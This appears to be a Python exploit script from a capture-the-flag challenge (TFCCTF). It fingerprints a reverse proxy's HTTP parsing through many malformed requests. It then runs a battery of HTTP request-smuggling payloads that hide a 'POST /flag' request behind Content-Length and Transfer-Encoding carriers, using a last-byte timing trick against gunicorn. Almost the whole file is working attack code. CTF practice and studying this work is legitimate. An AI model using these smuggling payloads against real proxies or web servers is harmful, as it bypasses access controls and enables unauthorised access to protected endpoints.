#!/usr/bin/env python3
"""
battery3 - a NEW proxoxy fingerprint plus a smuggle battery.

Part A rows are discriminators this challenge has never sent to the live target:
the HTTP-version allowlist, the method grammar, the Host-only-on-1.1 rule, the
Content-Length and Transfer-Encoding value grammars, the chunk-extension and
trailer-count caps, and the Content-Encoding failure modes.  If the deployed
binary or config differs from our rebuild in ANY of those, a row differs.

Part B rows are smuggle attempts: <carrier><POST /flag with brevski: george>,
sent all-but-the-last-byte, response 1 read, then the last byte (gunicorn's
gthread only processes buffered pipelined bytes when the socket becomes
readable again).  A row wins if TFCCTF{ appears.

usage: battery3.py <host> <port> [outfile]
"""
import socket, sys, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
OUT = sys.argv[3] if len(sys.argv) > 3 else None
LOG = []


def emit(s):
    print(s)
    LOG.append(s)
    sys.stdout.flush()


def once(payload, wait=1.2):
    """single write, read until quiet"""
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except Exception as e:
        return b"CONNERR:%r" % (e,)
    try:
        s.sendall(payload)
        s.settimeout(wait)
        out = b""
        try:
            while len(out) < 200000:
                d = s.recv(65536)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        return out
    except Exception as e:
        return b"SENDERR:%r" % (e,)
    finally:
        try:
            s.close()
        except Exception:
            pass


def lastbyte(payload, wait=1.2):
    """send all but the last byte, read, then the last byte, read"""
    try:
        s = socket.create_connection((HOST, PORT), timeout=6)
    except Exception as e:
        return b"CONNERR:%r" % (e,)
    try:
        s.sendall(payload[:-1])
        s.settimeout(wait)
        out = b""
        try:
            while len(out) < 200000:
                d = s.recv(65536)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        try:
            s.sendall(payload[-1:])
        except Exception:
            return out
        s.settimeout(wait)
        try:
            while len(out) < 200000:
                d = s.recv(65536)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        return out
    except Exception as e:
        return b"SENDERR:%r" % (e,)
    finally:
        try:
            s.close()
        except Exception:
            pass


def summ(r):
    if r.startswith(b"CONNERR") or r.startswith(b"SENDERR"):
        return "ERR"
    if not r:
        return "EATEN(0 bytes)"
    line = r.split(b"\r\n", 1)[0].decode("latin-1", "replace")[:34]
    return "%-34s len=%d n200=%d" % (line, len(r), r.count(b"HTTP/1.1 "))


H11 = b"POST /health HTTP/1.1\r\nHost: h\r\n"
SM = b"POST /flag HTTP/1.1\r\nHost: h\r\nbrevski: george\r\nContent-Length: 0\r\n\r\n"
SMZ = SM.replace(b"george", b"zzz")


def chunk(b, n=8):
    o = b""
    for i in range(0, len(b), n):
        p = b[i:i + n]
        o += ("%x" % len(p)).encode() + b"\r\n" + p + b"\r\n"
    return o


def part_a():
    emit("=== PART A: new proxoxy fingerprint discriminators ===")
    rows = []
    for v in [b"HTTP/1.1", b"HTTP/1.0", b"HTTP/1.2", b"HTTP/1.5", b"HTTP/1.9",
              b"HTTP/0.9", b"HTTP/2.0"]:
        rows.append(("ver." + v.decode(),
                     b"GET /health " + v + b"\r\nHost: h\r\n\r\n"))
    rows.append(("method.1A", b"1A /health HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\n\r\n"))
    rows.append(("method.1A;x", b"1A;x /health HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\n\r\n"))
    rows.append(("method.20char", b"A" * 20 + b" /health HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\n\r\n"))
    rows.append(("nohost.11", b"GET /health HTTP/1.1\r\n\r\n"))
    rows.append(("nohost.10", b"GET /health HTTP/1.0\r\n\r\n"))
    rows.append(("nohost.10.hdr", b"GET /health HTTP/1.0\r\nX-A: 1\r\n\r\n"))
    for cl in [b"0", b"0,0", b"0 ", b" 0", b"+0", b"0x0", b"00", b"0\xa0"]:
        rows.append(("cl." + repr(cl)[2:-1],
                     H11 + b"Content-Length: " + cl + b"\r\n\r\n"))
    for te in [b"chunked", b"chunked\xa0", b"gzip,chunked", b"deflate, chunked",
               b"compress, chunked", b"identity,chunked", b"chunked;a=b", b"br,chunked"]:
        rows.append(("te." + repr(te)[2:-1],
                     H11 + b"Transfer-Encoding: " + te + b"\r\n\r\n0\r\n\r\n"))
    for n in (8189, 8190, 8191):
        rows.append(("chunkext.%d" % n,
                     H11 + b"Transfer-Encoding: chunked\r\n\r\n0;" + b"a" * n + b"\r\n\r\n"))
    for n in (127, 128, 129):
        tr = b"".join(b"X%d: a\r\n" % i for i in range(n))
        rows.append(("trcount.%d" % n,
                     H11 + b"Transfer-Encoding: chunked\r\n\r\n0\r\n" + tr + b"\r\n"))
    for n in (124, 125, 126):
        pads = b"".join(b"X-p%d: 1\r\n" % i for i in range(n))
        rows.append(("hdrcount.%d" % n,
                     b"GET /health HTTP/1.1\r\nHost: h\r\n" + pads + b"\r\n"))
    import gzip as _gz
    rows.append(("ce.gzip.bad", H11 + b"Content-Encoding: gzip\r\nContent-Length: 4\r\n\r\nAAAA"))
    rows.append(("ce.br.bad", H11 + b"Content-Encoding: br\r\nContent-Length: 4\r\n\r\n\xff\xff\xff\xff"))
    rows.append(("ce.zstd.bad", H11 + b"Content-Encoding: zstd\r\nContent-Length: 4\r\n\r\n\xff\xff\xff\xff"))
    rows.append(("ce.gzip.ok", H11 + b"Content-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" % len(_gz.compress(b"x")) + _gz.compress(b"x")))
    rows.append(("trailer.brev.g",
                 b"POST /flag HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nbrevski: george\r\n\r\n"))
    rows.append(("trailer.brev.z",
                 b"POST /flag HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nbrevski: zzz\r\n\r\n"))
    rows.append(("head.brev.g", SM))
    rows.append(("head.brev.z", SMZ))
    rows.append(("ctrl.health", b"GET /health HTTP/1.1\r\nHost: h\r\n\r\n"))
    for name, p in rows:
        r = once(p)
        emit("A %-18s %s" % (name, summ(r)))
        if b"TFCCTF{" in r:
            emit("!!!! FLAG !!!! %r" % r)
        time.sleep(0.12)


def part_b():
    emit("=== PART B: smuggle battery (last-byte trick) ===")
    carriers = [
        ("cl0", H11 + b"Content-Length: 0\r\n\r\n"),
        ("cl8", H11 + b"Content-Length: 8\r\n\r\nAAAABBBB"),
        ("te0", H11 + b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
        ("te.tr", H11 + b"Transfer-Encoding: chunked\r\n\r\n0\r\nX: v\r\n\r\n"),
        ("te.data", H11 + b"Transfer-Encoding: chunked\r\n\r\n" + chunk(b"AAAABBBB") + b"0\r\n\r\n"),
        ("te.ext", H11 + b"Transfer-Encoding: chunked\r\n\r\n0;a=b\r\n\r\n"),
        ("te.0pad", H11 + b"Transfer-Encoding: chunked\r\n\r\n000\r\n\r\n"),
        ("nobody", H11 + b"\r\n"),
        ("http10", b"POST /health HTTP/1.0\r\nHost: h\r\nContent-Length: 0\r\n\r\n"),
        ("headless10", b"POST /health HTTP/1.0\r\n\r\n"),
        ("headless11", b"POST /health HTTP/1.1\r\n\r\n"),
        ("cl0.under", H11 + b"Content_Length: 0\r\n\r\n"),
        ("te.under", H11 + b"Transfer_Encoding: chunked\r\n\r\n"),
        ("cl.comma", H11 + b"Content-Length: 0,0\r\n\r\n"),
        ("dupcl", H11 + b"Content-Length: 0\r\nContent-Length: 0\r\n\r\n"),
        ("script", H11 + b"SCRIPT_NAME: /p\r\nContent-Length: 0\r\n\r\n"),
    ]
    for name, car in carriers:
        p = car + SM
        r = lastbyte(p)
        win = b"TFCCTF{" in r
        emit("B %-14s %s%s" % (name, summ(r), "   *** FLAG ***" if win else ""))
        if win:
            emit("!!!! %r" % r)
        time.sleep(0.15)
    # trailer-channel variants of the smuggle
    tr = [
        ("tr.after", H11 + b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
        ("tr.inline", b"POST /flag HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nbrevski: george\r\nX: 1\r\n\r\n"),
    ]
    for name, p in tr:
        r = once(p + (b"" if name != "tr.after" else SM))
        emit("B %-14s %s" % (name, summ(r)))
        if b"TFCCTF{" in r:
            emit("!!!! FLAG !!!! %r" % r)
        time.sleep(0.15)


part_a()
part_b()
if OUT:
    open(OUT, "w").write("target %s:%d\n" % (HOST, PORT) + "\n".join(LOG) + "\n")
